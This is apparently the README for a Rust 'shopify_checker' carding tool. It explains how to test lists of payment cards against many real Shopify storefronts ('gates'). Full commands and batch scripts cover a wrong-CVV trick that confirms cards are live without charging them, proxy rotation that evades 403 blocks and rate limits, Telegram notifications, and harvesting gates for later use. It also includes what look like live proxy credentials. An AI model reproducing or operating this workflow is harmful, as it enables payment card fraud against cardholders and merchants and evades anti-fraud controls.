# Using Chunk Gates with Proxy Support

## Overview

The checker now supports **both JSON and plain text gate files**, making it easy to use the chunk files in `ShopifyGatesAndChunks/` directory.

## Fixed Issues

✅ **JSON Parsing Error Fixed** - The checker now automatically detects file format
✅ **Plain Text Support** - Chunk files with one URL per line now work
✅ **Proxy Integration** - Full proxy support with rotation
✅ **Authorization Mode** - CVV_MISMATCH detection for card validation

## File Format Support

### JSON Format (production_gates.json)
```json
[
  {
    "url": "https://donate.example.com",
    "gateway": "Shopify",
    "donation_form": true
  }
]
```

### Plain Text Format (chunk files)
```
https://turningpointe.myshopify.com
https://camberkits.myshopify.com
https://lemstyle.myshopify.com
```

The checker automatically detects which format you're using!

## Quick Start

### 1. Prepare Your Files

**Cards File** (`test_cards.txt`):
```
4532015112830366|12|2027|999
5425233430109903|11|2026|456
```

**Proxies File** (`proxies.txt`):
```
evo-pro.porterproxies.com:62345:PP_5J7SVIL0BJ-country-US-state-Florida:95cc2n4b
```

### 2. Start ChromeDriver
```bash
chromedriver --port=9515 &
```

### 3. Run with Chunk Gates

**Test 3 gates from chunk_000:**
```bash
./target/release/shopify_checker rotate \
  --gates ShopifyGatesAndChunks/chunk_000.txt \
  --cards-file test_cards.txt \
  --proxy-file proxies.txt \
  --max-gates 3
```

**Test all gates in a chunk:**
```bash
./target/release/shopify_checker rotate \
  --gates ShopifyGatesAndChunks/chunk_000.txt \
  --cards-file test_cards.txt \
  --proxy-file proxies.txt
```

**Test multiple chunks:**
```bash
for chunk in ShopifyGatesAndChunks/chunk_00{0..9}.txt; do
  echo "Testing $chunk..."
  ./target/release/shopify_checker rotate \
    --gates "$chunk" \
    --cards-file test_cards.txt \
    --proxy-file proxies.txt \
    --max-gates 10
  sleep 5
done
```

## Expected Output

```
🔐 AUTHORIZATION-ONLY MODE
   Using wrong CVV to check cards WITHOUT charging
   Only CVV_MISMATCH responses will be counted as valid

🔒 Loading proxies...
✓ Loaded 30 proxies
ℹ Proxy stats: 30 available, 0 failed

→ Loading cards from file...
✓ Loaded 2 card(s)

→ Loading gates from file...
✓ Loaded 100 gate(s) from chunk file

🔒 Using proxy: evo-pro.porterproxies.com:62345

Testing gate 1/3: https://turningpointe.myshopify.com
  Card: 453201...999
  → Trying authorization...
  ✓ CVV_MISMATCH - Card is valid!

Testing gate 2/3: https://camberkits.myshopify.com
  Card: 453201...999
  → Trying authorization...
  ✗ DECLINED

Testing gate 3/3: https://lemstyle.myshopify.com
  Card: 542523...456
  → Trying authorization...
  ✓ CVV_MISMATCH - Card is valid!

═══════════════════════════════════════════════════════════
✅ RESULTS SUMMARY
═══════════════════════════════════════════════════════════

Valid Gates Found: 2/3

✓ https://turningpointe.myshopify.com
  Card: 453201...999
  Status: CVV_MISMATCH

✓ https://lemstyle.myshopify.com
  Card: 542523...456
  Status: CVV_MISMATCH

Results saved to: rotate_results_TIMESTAMP.json
```

## Authorization-Only Mode

The checker runs in **authorization-only mode** by default, which means:

✅ Uses **wrong CVV** (999) to test cards
✅ Only looks for **CVV_MISMATCH** responses
✅ **NO CHARGES** are made
✅ Validates card without spending money

This is perfect for:
- Finding valid donation gates
- Testing card validity
- Scraping gates for later use

## Proxy Rotation

Proxies automatically rotate when:
- 403 Forbidden errors occur
- Connection timeouts happen
- After 3 failures, proxy is removed

Monitor proxy stats in the output:
```
ℹ Proxy stats: 28 available, 2 failed
🔒 Switching to next proxy...
```

## Advanced Usage

### Test Specific Number of Gates
```bash
./target/release/shopify_checker rotate \
  --gates ShopifyGatesAndChunks/chunk_000.txt \
  --cards-file test_cards.txt \
  --proxy-file proxies.txt \
  --max-gates 50
```

### Without Proxies (if not needed)
```bash
./target/release/shopify_checker rotate \
  --gates ShopifyGatesAndChunks/chunk_000.txt \
  --cards-file test_cards.txt
```

### With Telegram Notifications
```bash
./target/release/shopify_checker rotate \
  --gates ShopifyGatesAndChunks/chunk_000.txt \
  --cards-file test_cards.txt \
  --proxy-file proxies.txt \
  --telegram-config telegram_config.json
```

## Batch Processing Script

Create `test_all_chunks.sh`:
```bash
#!/bin/bash

CARDS="test_cards.txt"
PROXIES="proxies.txt"
MAX_GATES=20

for chunk in ShopifyGatesAndChunks/chunk_*.txt; do
  echo "═══════════════════════════════════════"
  echo "Testing: $chunk"
  echo "═══════════════════════════════════════"
  
  ./target/release/shopify_checker rotate \
    --gates "$chunk" \
    --cards-file "$CARDS" \
    --proxy-file "$PROXIES" \
    --max-gates "$MAX_GATES"
  
  echo ""
  echo "Waiting 10 seconds before next chunk..."
  sleep 10
done

echo "✅ All chunks tested!"
```

Run it:
```bash
chmod +x test_all_chunks.sh
./test_all_chunks.sh
```

## Output Files

Results are saved to:
- `rotate_results_TIMESTAMP.json` - Detailed results
- Console output - Real-time progress

Example result file:
```json
[
  {
    "gate": "https://turningpointe.myshopify.com",
    "card": "453201...999",
    "status": "CVV_MISMATCH",
    "valid": true,
    "timestamp": "2024-12-22T10:30:45Z"
  }
]
```

## Troubleshooting

### "expected value at line 1 column 1"
**Fixed!** This error occurred when trying to parse plain text files as JSON. The checker now auto-detects the format.

### "Failed to open cards file"
Create your cards file:
```bash
cat > test_cards.txt << 'EOF'
4532015112830366|12|2027|999
EOF
```

### "ChromeDriver not running"
Start it:
```bash
chromedriver --port=9515 &
```

### All proxies failing
Check proxy credentials in `proxies.txt` and ensure they're valid.

## Best Practices

1. **Start Small** - Test with `--max-gates 5` first
2. **Monitor Proxies** - Watch for proxy failures
3. **Use Delays** - Add sleep between chunks
4. **Save Results** - Keep result files for analysis
5. **Rotate Proxies** - Add more proxies if needed

## Performance Tips

- **Concurrent Testing**: The checker tests gates sequentially for reliability
- **Proxy Pool**: Use 20-30 proxies for best results
- **Chunk Size**: Test 10-50 gates per run
- **Rate Limiting**: Add delays between chunks

## Summary

✅ **Fixed**: JSON parsing error
✅ **Added**: Plain text file support
✅ **Working**: Proxy rotation
✅ **Ready**: Authorization-only mode
✅ **Compatible**: All chunk files in ShopifyGatesAndChunks/

You're now ready to test all chunk gates with proxy support!
